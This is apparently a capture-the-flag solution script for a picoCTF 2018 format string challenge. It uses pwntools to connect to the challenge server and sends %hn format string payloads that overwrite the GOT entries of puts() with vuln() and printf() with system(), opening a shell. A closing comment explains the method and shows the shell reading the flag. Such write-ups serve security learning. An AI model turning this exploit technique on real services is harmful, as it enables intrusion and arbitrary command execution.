from pwn import *

import struct

def p(x):
    return struct.pack("I", x)

def get_lower(x):
    return x & 0xFFFF

def get_upper(x):
    return (x & 0xFFFF0000) >> 16

r = remote("2018shell3.picoctf.com", 56800)
print(r.recvline().strip())

system = 0x8048460
puts = 0x804a01c
printf = 0x804a010
vuln = 0x80485ab

# Overwrite puts() with vuln()
payload = p(puts) + p(puts+2)
payload += "%" + str(get_upper(vuln) - len(payload)) + "c%8$hn"
payload += "%" + str(get_lower(vuln) - get_upper(vuln)) + "c%7$hn"
r.sendline(payload)
r.recvline()

# Overwrite printf() with system()
payload = p(printf) + p(printf+2)
payload += "%" + str(get_upper(system) - len(payload)) + "c%8$hn"
payload += "%" + str(get_lower(system) - get_upper(system)) + "c%7$hn"
r.sendline(payload)
r.recvline()

# Now we have a shell!
r.interactive()

"""
The main goal of the challenge is to overwrite the addresses of two functions in order to get a shell.
To get around the issue of not being able to interact with the program more than once, we can overwrite puts() to call vuln() once again.
After that, we can overwrite printf() to point to system(). This essentially gives us a shell
that will run any input we give it, allowing us to view the flag.

input your message:
$ ls
echoback
echoback.c
flag.txt
xinet_startup.sh
input your message:
$ cat flag.txt
picoCTF{foRm4t_stRinGs_aRe_3xtra_DanGer0us_ab9a5c09}
"""
